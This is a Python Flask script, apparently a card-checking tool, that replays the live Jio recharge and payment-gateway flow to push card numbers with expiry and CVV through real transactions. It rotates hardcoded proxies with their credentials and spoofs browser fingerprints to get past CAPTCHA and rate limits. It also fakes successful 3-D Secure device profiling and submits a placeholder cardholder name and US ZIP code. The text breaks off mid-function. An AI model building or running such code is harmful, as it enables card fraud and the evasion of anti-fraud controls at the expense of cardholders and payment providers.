"""
jio_new.py — Jio recharge client rebuilt around the LIVE jio.com flow.

The old `jio.py` talked to the gateway with a guessed body (raw card data posted
straight to Payglocal, hardcoded `mastercard`, no ZIP, no 3DS).  This file
reproduces what the real browser does, request for request, using the traffic
captured from https://www.jio.com/selfcare/recharge/mobility/ :

    1  GET  https://www.jio.com/selfcare/recharge/mobility/          warm session
    2  GET  /api/jio-authenticate-service/authenticate/authJsonData  session cookies
    3  GET  /api/jio-recharge-service/recharge/mobility/number/<n>   number lookup
    4  GET  /api/jio-recharge-service/recharge/plans/serviceId/<n>   plan catalogue
    5  POST /api/jio-recharge-service/recharge/buy                   {planKey, selectedService}
    6  POST /api/jio-recharge-service/recharge/pay                   {addonPlanKeys, ...}
    7  GET  /api/jio-common-servlet/jiocommon/redirect              → auto-post form
    8  POST https://pay.jio.com/jiopg/v1/payment-options            (form-urlencoded)
    9  POST https://pay.jio.com/jiopg/v1/authorize-card-operation   → "SC_…" token
   10  POST https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation   → easebuzz ACS form
   11  POST https://pay.easebuzz.in/acs/v1/redirection              → x-gl-token
   12  GET  https://api.payglocal.com/gl/v2/payments/redirect/dc    payflow context
   13  GET  /gl/v1/payments/payflow/data/countrycode/<cc>/zipcode/<zip>
   14  POST /gl/v1/payments/risk/fp                                 → encryption kid
   15  POST /gl/v2/payments/pd/paynow                               → nextAction
   16  POST /gl/v2/payments/dc/ipay                                 → issuer response
   17  GET  /gl/v1/payments/retry/data                              → step-up details

Differences vs. the old script, on purpose:
  * the card is tokenised by Jio (step 10) — the raw PAN never reaches Payglocal
  * card brand (visa/mastercard/…) is derived from the BIN, not hardcoded
  * the Payglocal page is entered with a real billing ZIP + country
  * Cardinal 3-D Secure data collection is reproduced (step 15b)
  * GL-201-017 / SECURITY_RISK_DECLINE is reported as a *bank step-up*, not a
    plain decline, exactly like the live page ("Almost there! Confirm with your bank")

Proxy rotation: RAW_PROXIES (or ?proxy=/?proxies=) with dead-proxy cooldown,
random curl_cffi TLS impersonation (Chrome/Edge/Firefox/Safari) + matching UA.
Easebuzz rejects amounts below GATEWAY_MIN_AMOUNT (default ₹20, env JIO_MIN_AMOUNT).

Run:   ./venv/bin/python jio_new.py
Call:  curl "http://127.0.0.1:5001/rc?jio=9692388210&amount=20&cc=4030570000425064|09|29|908&zip=10080"
       curl "http://127.0.0.1:5001/rc?jio=9692388210&amount=239&cc=...&proxy=http://user:pass@host:port"
"""

import base64
import html as _html
import json
import os
import random
import re
import string
import threading
import time
import uuid
from typing import Optional
from urllib.parse import parse_qs, unquote, urlparse

from flask import Flask, jsonify, request

app = Flask(__name__)

# ─────────────────────────── browser fingerprint ───────────────────────────
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
SEC_CH_UA = '"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"'
SEC_CH_PLATFORM = '"Windows"'
SEC_CH_MOBILE = "?0"
SCREEN = {"w": 1440, "h": 900, "depth": 24}
TZ = -330
try:
    GATEWAY_MIN_AMOUNT = float(os.environ.get("JIO_MIN_AMOUNT") or 20)
except ValueError:
    GATEWAY_MIN_AMOUNT = 20.0

# ─────────────────────────── proxies + browser pool ─────────────────────────
# Accepts every shape used by the providers:
#   scheme://host:port  |  scheme://user:pass@host:port  |  scheme://host:port:user:pass
RAW_PROXIES = [
    "http://37.218.219.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "http://5.249.177.8:5433:9T1GYK9U3S2B:SAWF8Y0JHSB0",
    "http://209.97.150.167:3128",
    "http://175.29.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "http://175.29.133.8:5433:799JRELTBPAE:F7BQ7D3EQSQA",
    "http://181.177.102.240:12345:tickets:proxyon145",
    "http://138.94.218.193:12345:tickets:proxyon145",
    "http://50.3.137.177:12345:tickets:proxyon145",
    "http://107.173.112.194:12345:tickets:proxyon145",
    "http://168.228.46.189:12345:tickets:proxyon145",
    "http://82.117.94.14:63126:RrkJjUqfT:jYEH6Emdg",
    "http://103.204.108.142:12345:naveed:Qwerty_123ABC",
]

BROWSERS = [
    {"impersonate": "chrome131",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "ch": {"sec-ch-ua": '"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"'},
     "screen": {"w": 1440, "h": 900, "depth": 24}},
    {"impersonate": "chrome136",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
     "ch": {"sec-ch-ua": '"Google Chrome";v="136", "Chromium";v="136", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"'},
     "screen": {"w": 1920, "h": 1080, "depth": 24}},
    {"impersonate": "chrome124",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "ch": {"sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"'},
     "screen": {"w": 1536, "h": 864, "depth": 24}},
    {"impersonate": "chrome120",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "ch": {"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"'},
     "screen": {"w": 1366, "h": 768, "depth": 24}},
    {"impersonate": "edge101",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
     "ch": {"sec-ch-ua": '"Microsoft Edge";v="101", "Chromium";v="101", "Not A;Brand";v="99"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"'},
     "screen": {"w": 1280, "h": 720, "depth": 24}},
    {"impersonate": "firefox133",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
     "ch": {}, "screen": {"w": 1366, "h": 768, "depth": 24}},
    {"impersonate": "firefox135",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
     "ch": {}, "screen": {"w": 1920, "h": 1080, "depth": 24}},
    {"impersonate": "safari170",
     "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
           "(KHTML, like Gecko) Version/17.0 Safari/605.1.15",
     "ch": {"sec-ch-ua-platform": '"macOS"'},
     "screen": {"w": 1680, "h": 1050, "depth": 24}},
]

_TL = threading.local()


def _profile() -> dict:
    return getattr(_TL, "profile", None) or BROWSERS[0]


def _ua() -> str:
    return _profile()["ua"]


def _screen() -> dict:
    return _profile().get("screen") or SCREEN


def _doc_headers(referer: str = None, site: str = "cross-site") -> dict:
    p = _profile()
    h = {"User-Agent": p["ua"],
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.9",
         "Upgrade-Insecure-Requests": "1",
         "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
         "Sec-Fetch-Site": site}
    if referer:
        h["Referer"] = referer
    h.update(p.get("ch") or {})
    return h


def _norm_proxy(p: str) -> str:
    p = (p or "").strip()
    if not p:
        return ""
    if "://" not in p:
        p = "http://" + p
    scheme, rest = p.split("://", 1)
    rest = rest.strip("/")
    if "@" in rest:
        return f"{scheme}://{rest}"
    parts = rest.split(":")
    if len(parts) == 2 and parts[1].isdigit():
        return f"{scheme}://{parts[0]}:{parts[1]}"
    if len(parts) >= 4:
        host, port = parts[0], parts[1]
        user, pw = parts[2], ":".join(parts[3:])
        return f"{scheme}://{user}:{pw}@{host}:{port}"
    return p


def _redact_proxy(p: str) -> str:
    if not p:
        return "direct"
    try:
        u = urlparse(p)
        return f"{u.scheme}://{u.hostname}{':' + str(u.port) if u.port else ''}"
    except Exception:
        return "proxy"


PROXIES = [_norm_proxy(p) for p in RAW_PROXIES]

_DEAD_PROXIES = {}
_DEAD_TTL = 240


def _is_dead(p: str) -> bool:
    ts = _DEAD_PROXIES.get(p)
    if not ts:
        return False
    if time.time() - ts > _DEAD_TTL:
        _DEAD_PROXIES.pop(p, None)
        return False
    return True


def _mark_dead(p: str):
    if p:
        _DEAD_PROXIES[p] = time.time()


def _proxy_candidates(proxy=None, proxies=None) -> list:
    if (os.environ.get("JIO_NO_PROXY") or "").lower() in ("1", "true", "yes"):
        return []
    env = os.environ.get("JIO_PROXIES")
    if proxies:
        raw = proxies if isinstance(proxies, (list, tuple)) else re.split(r"[\s,]+", str(proxies))
    elif proxy:
        raw = re.split(r"[\s,]+", str(proxy))
    elif env:
        raw = re.split(r"[\s,]+", env)
    else:
        raw = list(RAW_PROXIES)
    seen, alive = set(), []
    for p in raw:
        n = _norm_proxy(p)
        if not n or n in seen:
            continue
        seen.add(n)
        if not _is_dead(n):
            alive.append(n)
    random.shuffle(alive)
    return alive or [n for n in seen if n]


class _RetryFlow(Exception):
    """Raised when the whole flow should be restarted on another proxy."""


def _extract_gl_token(*texts) -> str:
    """Find the Payglocal token in URLs / forms / JSON / JS, encoded or not."""
    patterns = (
        r"x[-_]?gl[-_]?token\s*[=:]\s*[\"']?([A-Za-z0-9._~+/=-]{25,})",
        r"x[-_]?gl[-_]?token%3[dD]\s*%3[dD]\s*([A-Za-z0-9._~+/=%-]{25,})",
        r"\"xGlToken\"\s*:\s*\"([^\"]+)\"",
        r"\"glToken\"\s*:\s*\"([^\"]+)\"",
        r"\"x-gl-token\"\s*:\s*\"([^\"]+)\"",
        r"gl[_-]?token\s*[=:]\s*[\"']([A-Za-z0-9._~+/=-]{25,})",
        r"name=['\"](?:x-gl-token|glToken|token)['\"]\s+value=['\"]([A-Za-z0-9._~+/=-]{25,})['\"]",
        r"value=['\"]([A-Za-z0-9._~+/=-]{25,})['\"]\s+name=['\"](?:x-gl-token|glToken|token)['\"]",
        r"payflow-ui/\?[^\"'\s]+x-gl-token=([A-Za-z0-9._~+/=-]{25,})",
        r"redirect[^\"'\s]+x-gl-token=([A-Za-z0-9._~+/=-]{25,})",
    )
    blob_all = " ".join(_html.unescape(unquote(str(t or ""))) for t in texts)
    for rx in patterns:
        m = re.search(rx, blob_all, re.I)
        if m:
            tok = m.group(1).strip("\"'\\ ")
            tok = unquote(tok)
            if len(tok) > 25 and re.match(r"^[A-Za-z0-9._~+/=-]+$", tok):
                return tok
    m = re.search(r"[?&](?:x-gl-token|glToken|token)=([A-Za-z0-9._~+/=-]{30,})(?:[&#\s\"'<>]|$)",
                  blob_all, re.I)
    if m:
        tok = unquote(m.group(1)).strip("\"'\\ ")
        if re.match(r"^[A-Za-z0-9._~+/=-]+$", tok):
            return tok
    return ""


_GATES = (
    ("easebuzz", "easebuzz"), ("payglocal", "payglocal"), ("razorpay", "razorpay"),
    ("payu", "payu"), ("cashfree", "cashfree"), ("ccavenue", "ccavenue"),
    ("billdesk", "billdesk"), ("juspay", "juspay"), ("pinepg", "pinepg"),
    ("paytm", "paytm"), ("stripe", "stripe"),
)


def _gate_from_url(*urls) -> str:
    blob = " ".join(str(u or "") for u in urls).lower()
    for key, name in _GATES:
        if key in blob:
            return name
    return ""


def _gateway_error(resp) -> str:
    """Pull the human error out of a gateway /error redirect or error page."""
    url = getattr(resp, "url", "") or ""
    qs = parse_qs(urlparse(url).query) if url else {}
    for k in ("error_desc", "error", "message", "msg", "reason"):
        if qs.get(k) and qs[k][0].strip():
            return _short(unquote(qs[k][0]), 200)
    body = getattr(resp, "text", "") or ""
    m = re.search(r"(?:txn|transaction|amount)[^<]{0,90}"
                  r"(?:less|invalid|failed|declined|not allowed)[^<]{0,90}", body, re.I)
    if m:
        return _short(_html.unescape(m.group(0)), 200)
    m = re.search(r"class=[\"'](?:error|alert)[^\"']*[\"'][^>]*>(.*?)<", body, re.I | re.S)
    if m:
        return _short(re.sub(r"<[^>]+>", " ", m.group(1)), 200)
    return ""


def _looks_like_challenge(text: str) -> bool:
    return bool(re.search(r"one[- ]?time|enter.{0,24}(?:otp|password)|"
                          r"\botp\b|3[- ]?d ?secure|challenge", text or "", re.I))


def _extract_visitor_id(*texts) -> str:
    for text in texts:
        if not text:
            continue
        m = re.search(r"[\"']?visitorId[\"']?\s*[:=]\s*[\"']([A-Za-z0-9_-]{8,})",
                      str(text), re.I)
        if m:
            return m.group(1)
    return ""

# ─────────────────────────── endpoints (captured) ──────────────────────────
JIO_HOME = "https://www.jio.com/selfcare/recharge/mobility/"
JIO_PLANS_PAGE = "https://www.jio.com/selfcare/recharge/mobility/plans/"
JIO_AUTH = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
JIO_NUMBER = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{number}"
JIO_PLANS = "https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{number}"
JIO_BUY = "https://www.jio.com/api/jio-recharge-service/recharge/buy"
JIO_PAY = "https://www.jio.com/api/jio-recharge-service/recharge/pay"
JIO_REDIRECT = "https://www.jio.com/api/jio-common-servlet/jiocommon/redirect"
JIO_PAYMENT_OPTIONS = "https://pay.jio.com/jiopg/v1/payment-options"
JIO_AUTHORIZE_CARD = "https://pay.jio.com/jiopg/v1/authorize-card-operation"
JIO_CCDC = "https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation"
JIO_CARD_PAGE = "https://pay.jio.com/JpgWebApp/add-new-card/"

GL_BASE = "https://api.payglocal.com"
GL_DC = f"{GL_BASE}/gl/v2/payments/redirect/dc"
GL_ZIPCODE = f"{GL_BASE}/gl/v1/payments/payflow/data/countrycode/{{country}}/zipcode/{{zip}}"
GL_RISK_FP = f"{GL_BASE}/gl/v1/payments/risk/fp"
GL_PAYNOW = f"{GL_BASE}/gl/v2/payments/pd/paynow"
GL_IPAY = f"{GL_BASE}/gl/v2/payments/dc/ipay"
GL_RETRY = f"{GL_BASE}/gl/v1/payments/retry/data"

CARDINAL_COLLECT = "https://centinelapi.cardinalcommerce.com/V2/Cruise/Collect"
CARDINAL_REDIRECT = "https://centinelapi.cardinalcommerce.com/V2/Cruise/CollectRedirect"

# card brand → the values the live Jio form posts
CARD_BRANDS = {
    "visa":       {"customerCardTypeValue": "visa",       "cardType": "ic_visa",       "cardTypeText": "VISA_CARD"},
    "mastercard": {"customerCardTypeValue": "mastercard", "cardType": "ic_mastercard", "cardTypeText": "MASTERCARD_CARD"},
    "amex":       {"customerCardTypeValue": "amex",       "cardType": "ic_amex",       "cardTypeText": "AMEX_CARD"},
    "discover":   {"customerCardTypeValue": "discover",   "cardType": "ic_discover",   "cardTypeText": "DISCOVER_CARD"},
    "diners":     {"customerCardTypeValue": "diners",     "cardType": "ic_diners",     "cardTypeText": "DINERS_CARD"},
    "jcb":        {"customerCardTypeValue": "jcb",        "cardType": "ic_jcb",        "cardTypeText": "JCB_CARD"},
    "rupay":      {"customerCardTypeValue": "rupay",      "cardType": "ic_ruPay",      "cardTypeText": "RUPAY_CARD"},
}


# ─────────────────────────────── helpers ───────────────────────────────
def _mask(cc: str) -> str:
    return f"{cc[:6]}xxxxxx{cc[-4:]}"


def _short(msg, limit: int = 160) -> str:
    if not msg:
        return "No response"
    s = re.sub(r"\s+", " ", str(msg)).strip()
    return s[:limit] if len(s) <= limit else s[: limit - 3] + "..."


def _parse_card(raw: str) -> Optional[dict]:
    m = re.search(r"(\d{13,19})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})", raw or "")
    if not m:
        return None
    cc, mm, yy, cvv = m.groups()
    if len(yy) == 2:
        yy = "20" + yy
    if not (1 <= int(mm) <= 12) or not (2020 <= int(yy) <= 2100):
        return None
    if not (3 <= len(cvv) <= 4):
        return None
    return {"cc": cc, "mm": mm.zfill(2), "yy": yy, "cvv": cvv}


def _card_brand(bin6: str) -> str:
    b = (bin6 or "")[:6]
    if not b.isdigit():
        return "visa"
    if b[0] == "4":
        return "visa"
    if b[0] == "5" and b[1] in "12345":
        return "mastercard"
    if b[:2] in ("34", "37"):
        return "amex"
    if b[:2] == "35":
        return "jcb"
    if b[:2] in ("36", "38", "39"):
        return "diners"
    if b[0] == "6":
        return "discover"
    if b[:3] in ("508", "60", "65", "81", "82"):
        return "rupay"
    return "visa"


def _brand_fields(bin6: str) -> dict:
    return CARD_BRANDS.get(_card_brand(bin6), CARD_BRANDS["visa"])


def _api_error(resp) -> str:
    code = getattr(resp, "status_code", 0)
    text = ""
    try:
        body = resp.json()
        if isinstance(body, dict):
            text = (body.get("errorMessage") or body.get("message")
                    or body.get("error") or body.get("dynMsg") or "")
        elif body:
            text = str(body)
    except Exception:
        try:
            text = (resp.text or "")[:120]
        except Exception:
            text = ""
    return _short(f"HTTP {code} {text}".strip(), 200)


def _jio_headers(referer: str, content_type: str = None, origin: str = None,
                 extra: Optional[dict] = None) -> dict:
    p = _profile()
    h = {
        "User-Agent": p["ua"],
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": referer,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }
    h.update(p.get("ch") or {})
    if content_type:
        h["Content-Type"] = content_type
    if origin:
        h["Origin"] = origin
    if extra:
        h.update(extra)
    return h


def _gl_headers(referer: str, content_type: str = None, extra: Optional[dict] = None) -> dict:
    p = _profile()
    h = {
        "User-Agent": p["ua"],
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": referer,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "x-request-time": str(int(time.time() * 1000)),
    }
    h.update(p.get("ch") or {})
    if content_type:
        h["Content-Type"] = content_type
    if extra:
        h.update(extra)
    return h


def _browser_details() -> dict:
    """browserDetails block used by the Payglocal web app."""
    screen = _screen()
    return {
        "colorDepth": screen["depth"],
        "javaEnabled": False,
        "javaScriptEnabled": True,
        "language": "en-US",
        "screenHeight": screen["h"],
        "screenWidth": screen["w"],
        "timeZone": TZ,
        "userAgent": _ua(),
    }


def _form_fields(html: str) -> dict:
    fields = {}
    for m in re.finditer(r"name=['\"]([^'\"]+)['\"]\s+value=['\"]([^'\"]*)['\"]", html or ""):
        fields[m.group(1)] = m.group(2)
    for m in re.finditer(r"value=['\"]([^'\"]*)['\"]\s+name=['\"]([^'\"]+)['\"]", html or ""):
        fields.setdefault(m.group(2), m.group(1))
    return fields


def _form_action(html: str) -> str:
    m = re.search(r"action=['\"]([^'\"]+)['\"]", html or "")
    return m.group(1) if m else ""


def _jwt_claims(token: str) -> dict:
    try:
        part = token.split(".")[1]
        part += "=" * (-len(part) % 4)
        return json.loads(base64.urlsafe_b64decode(part).decode("utf-8", "replace"))
    except Exception:
        return {}


def _resp(status: str, message: str, number: str, card: str, amount=None,
          plan: str = "", gate: str = "payglocal", **extra) -> dict:
    try:
        amt_out = float(amount) if amount not in (None, "") else "N/A"
        if isinstance(amt_out, float) and amt_out.is_integer():
            amt_out = int(amt_out)
    except Exception:
        amt_out = amount if amount not in (None, "") else "N/A"
    out = {
        "status": (status or "error").lower(),
        "amount": amt_out,
        "gate": gate or "unknown",
        "response": _short(message),
        "plan": plan or "",
        "number": number or "",
        "card": card or "",
    }
    out.update(extra)
    return out


# ───────────────────────────── plan selection ─────────────────────────────
def _iter_plans(payload):
    """Walk planCategories → subCategories → plans exactly like the live page."""
    data = payload.get("data") if isinstance(payload, dict) else None
    if isinstance(data, (dict, list)):
        payload = data
    cats = payload.get("planCategories") or payload.get("planCategoryList") or []
    for cat in cats:
        if not isinstance(cat, dict):
            continue
        cat_label = (cat.get("type") or cat.get("name")
                     or cat.get("categoryName") or cat.get("title") or "")
        for sub in (cat.get("subCategories") or cat.get("subCategoryList") or []):
            if not isinstance(sub, dict):
                continue
            for plan in (sub.get("plans") or sub.get("planList") or []):
                if isinstance(plan, dict):
                    yield plan, cat_label
        for plan in (cat.get("plans") or cat.get("planList") or []):
            if isinstance(plan, dict):
                yield plan, cat_label
    for plan in (payload.get("plans") or payload.get("planList") or []):
        if isinstance(plan, dict):
            yield plan, ""


def _select_plan(payload, target: float):
    """Return (plan_key, plan_name, amount) for the plan matching `target`."""
    candidates = []
    for plan, cat_label in _iter_plans(payload):
        try:
            amt = float(plan.get("amount") or 0)
        except (TypeError, ValueError):
            continue
        if amt <= 0:
            continue
        key = plan.get("key") or plan.get("planKey") or ""
        if not key:
            continue
        candidates.append({
            "key": key,
            "amount": amt,
            "name": (plan.get("planName") or plan.get("name")
                     or plan.get("description") or cat_label or f"₹{amt:g}"),
            "label": (plan.get("categoryLabel") or cat_label or ""),
        })

    exact = [c for c in candidates if abs(c["amount"] - target) < 0.01]
    if not exact:
        return None, None, sorted({c["amount"] for c in candidates})
    # the live page buys from the "Data Packs" category
    data_packs = [c for c in exact if "data" in c["label"].lower()]
    chosen = (data_packs or exact)[0]
    return chosen["key"], chosen["name"], chosen["amount"]


# ───────────────────────────── 3-D Secure ─────────────────────────────
def _cardinal_collect(sess, form: dict, log) -> dict:
    """
    Reproduce the Cardinal Commerce data collection the hosted page performs.

    The live page posts the access token to /V2/Cruise/Collect, the Cardinal
    SDK fingerprints the browser and finally calls /V2/Cruise/CollectRedirect.
    Payglocal then forwards the SDK's "profile.completed" message to the
    gateway as `cardinalRequest` on the ipay call.
    """
    payload = form.get("payload") or {}
    token = payload.get("token") or ""
    claims = _jwt_claims(token)
    reference_id = claims.get("ReferenceId") or str(uuid.uuid4())
    org_unit_id = claims.get("OrgUnitId") or ""
    started = time.time()

    log(f"      cardinal ref={reference_id[:8]}… org={org_unit_id[:8] or '-'}")

    # 1) Collect — hands back the fingerprint page
    df_url = ""
    mcs_id = f"0_{uuid.uuid4()}"
    try:
        r = sess.post(CARDINAL_COLLECT, data={"JWT": token}, timeout=25, verify=False,
                      headers={"Content-Type": "application/x-www-form-urlencoded",
                               "Origin": "https://api.payglocal.com",
                               "Referer": "https://api.payglocal.com/",
                               "User-Agent": _ua()})
        html = r.text or ""
        m = re.search(r"id=['\"]dfUrlFullValue['\"][^>]*value=['\"]([^'\"]+)['\"]", html)
        if m:
            df_url = m.group(1)
        m = re.search(r"id=['\"]mcsId['\"][^>]*value=['\"]([^'\"]+)['\"]", html)
        if m:
            mcs_id = m.group(1)
        log(f"      collect → {r.status_code} df={'yes' if df_url else 'no'}")
    except Exception as exc:
        log(f"      collect failed: {exc}")

    # 2) device fingerprint (best effort — the gateway only needs the result)
    if df_url:
        try:
            sess.post(df_url, data={"nonce": str(uuid.uuid4())}, timeout=25, verify=False,
                      headers={"Content-Type": "application/x-www-form-urlencoded",
                               "Origin": "https://centinelapi.cardinalcommerce.com",
                               "User-Agent": _ua()})
        except Exception:
            pass

    # 3) CollectRedirect — what the SDK posts when profiling succeeds
    data_sources = json.dumps({"CardinalData": {"Attempted": True, "Completed": True},
                               "MethodUrl": {"Attempted": False, "Completed": False}},
                              separators=(",", ":"))
    try:
        sess.post(CARDINAL_REDIRECT, timeout=25, verify=False,
                  data={"McsId": mcs_id, "DataSources": data_sources,
                        "ActionCode": "SUCCESS", "Error": "", "DfResults": ""},
                  headers={"Content-Type": "application/x-www-form-urlencoded",
                           "Origin": "https://centinelapi.cardinalcommerce.com",
                           "Referer": "https://centinelapi.cardinalcommerce.com/",
                           "User-Agent": _ua()})
        log("      collectRedirect → sent")
    except Exception as exc:
        log(f"      collectRedirect failed: {exc}")

    # the hosted page hands the SDK message over as
    #   {messageType: c.MessageType, payload: JSON.stringify(c.Payload), processingTime: ms}
    # so the payload has to be a JSON *string*, not a nested object.
    payload_obj = {
        "ActionCode": "SUCCESS",
        "SessionId": reference_id,
        "DataSources": {"CardinalData": {"Attempted": True, "Completed": True},
                        "MethodUrl": {"Attempted": False, "Completed": False}},
    }
    return {
        "messageType": "profile.completed",
        "payload": json.dumps(payload_obj, separators=(",", ":")),
        "processingTime": int((time.time() - started) * 1000),
    }


# ───────────────────────────── main flow ─────────────────────────────
def _recharge_once(number: str, card: dict, amount: float, zip_code: str = "10080",
                   country: str = "US", card_name: str = "JOHN DOE",
                   proxy: Optional[str] = None, profile: Optional[dict] = None) -> dict:
    _TL.profile = profile or random.choice(BROWSERS)
    masked = _mask(card["cc"])
    bin6 = card["cc"][:6]
    brand = _brand_fields(bin6)

    def log(msg):
        print(msg, flush=True)

    try:
        from curl_cffi import requests as cffi
    except ImportError:
        return _resp("error", "curl_cffi is not installed", number, masked, amount=amount)

    sess = cffi.Session(impersonate=_profile()["impersonate"])
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}

    def req(method, url, **kw):
        kw.setdefault("timeout", 30)
        kw.setdefault("verify", False)
        try:
            r = sess.request(method, url, **kw)
        except Exception as exc:
            if proxy:
                _mark_dead(proxy)
                raise _RetryFlow(f"proxy failed ({_short(str(exc), 70)})")
            raise
        log(f"    [{method}] {url[:74]} → {r.status_code}")
        if r.status_code in (407, 429) or (r.status_code == 403 and proxy):
            if proxy:
                _mark_dead(proxy)
            raise _RetryFlow(f"http {r.status_code} via {_redact_proxy(proxy)}")
        return r

    try:
        # ── 1/2 warm session + authenticate ──────────────────────────
        log("  [1] warm session")
        req("GET", JIO_HOME, headers=_doc_headers())

        log("  [2] authJsonData")
        req("GET", JIO_AUTH, headers=_jio_headers(JIO_HOME))

        # ── 3 number lookup ───────────────────────────────────────────
        log("  [3] number lookup")
        r3 = req("GET", JIO_NUMBER.format(number=number),
                 headers=_jio_headers(JIO_HOME, origin="https://www.jio.com"))
        if r3.status_code != 200:
            err = _api_error(r3)
            if "CAPTCHA" in err.upper() or "HTTP 429" in err:
                if proxy:
                    _mark_dead(proxy)
                raise _RetryFlow("Jio rate limited (CAPTCHA_REQUIRED)")
            return _resp("error", f"Lookup failed: {err}", number, masked, amount=amount)
        try:
            lookup = r3.json()
        except Exception:
            lookup = {}
        if lookup.get("errorMessage") == "NOT_SUBSCRIBED_USER":
            return _resp("error", "Not a Jio number", number, masked, amount=amount)

        billing_type = lookup.get("billingType") or "PREPAID"
        next_val = lookup.get("nextPage") or billing_type
        plans_ref = (f"{JIO_PLANS_PAGE}?serviceId={number}&serviceType=mobility"
                     f"&next={next_val}&billingType={billing_type}")

        # ── 4 plans ───────────────────────────────────────────────────
        log("  [4] plans")
        r4 = req("GET", JIO_PLANS.format(number=number), headers=_jio_headers(plans_ref))
        if r4.status_code != 200:
            err = _api_error(r4)
            if "CAPTCHA" in err.upper() or "HTTP 429" in err:
                if proxy:
                    _mark_dead(proxy)
                raise _RetryFlow("Jio rate limited (CAPTCHA_REQUIRED)")
            return _resp("error", f"Plans API error: {err}", number, masked, amount=amount)
        try:
            plans_payload = r4.json()
        except Exception:
            return _resp("error", "Plans API returned non-JSON", number, masked, amount=amount)

        plan_key, plan_name, plan_amount = _select_plan(plans_payload, amount)
        if not plan_key:
            return _resp("error", f"No plan for ₹{amount:g}", number, masked, amount=amount,
                         available_amounts=plan_amount)
        log(f"      plan: {plan_name} ₹{plan_amount:g} ({plan_key})")

        # ── 5/6 buy + pay ─────────────────────────────────────────────
        log("  [5] buy")
        r5 = req("POST", JIO_BUY, headers=_jio_headers(
            plans_ref, "application/json", "https://www.jio.com"),
            json={"planKey": plan_key, "selectedService": number})
        if r5.status_code != 200:
            return _resp("error", f"Buy failed: {_api_error(r5)}", number, masked,
                         amount=plan_amount, plan=plan_name)

        log("  [6] pay")
        r6 = req("POST", JIO_PAY, headers=_jio_headers(
            plans_ref, "application/json", "https://www.jio.com"),
            json={"addonPlanKeys": [], "flexiTopupFlow": False,
                  "servicePlanList": [{"planKey": plan_key, "quantity": 1, "serviceId": number}]})
        if r6.status_code != 200:
            return _resp("error", f"Pay failed: {_api_error(r6)}", number, masked,
                         amount=plan_amount, plan=plan_name)

        # ── 7 redirect to the gateway ─────────────────────────────────
        log("  [7] redirect")
        r7 = req("GET", JIO_REDIRECT,
                 headers=_doc_headers(referer=plans_ref, site="same-origin"))
        fields = _form_fields(r7.text or "")
        if not fields:
            fields = {"param1": f"{uuid.uuid4()}-{uuid.uuid4()}", "param2": "JIO",
                      "header": "false", "theme": "null", "gaparam": "null",
                      "native": "null", "useJpgToken": "true"}
        action = _form_action(r7.text or "") or JIO_PAYMENT_OPTIONS

        # ── 8 payment portal ──────────────────────────────────────────
        log("  [8] payment portal")
        r8 = req("POST", action, data=fields, allow_redirects=True,
                 headers={"Content-Type": "application/x-www-form-urlencoded",
                          "Origin": "https://www.jio.com",
                          "Referer": "https://www.jio.com/",
                          **_doc_headers()})
        portal_ref = r8.url

        # ── 9 authorize card operation ────────────────────────────────
        log("  [9] authorize card operation")
        r9 = req("POST", JIO_AUTHORIZE_CARD, headers=_jio_headers(
            JIO_CARD_PAGE, "application/json", "https://pay.jio.com"),
            json={"paymentMode": "CCDC", "cardPrefix": bin6, "isEMISelected": False,
                  "viewOffer": False, "skuCode": None, "copco": None,
                  "isStoreCreditSelected": None})
        try:
            d9 = r9.json()
        except Exception:
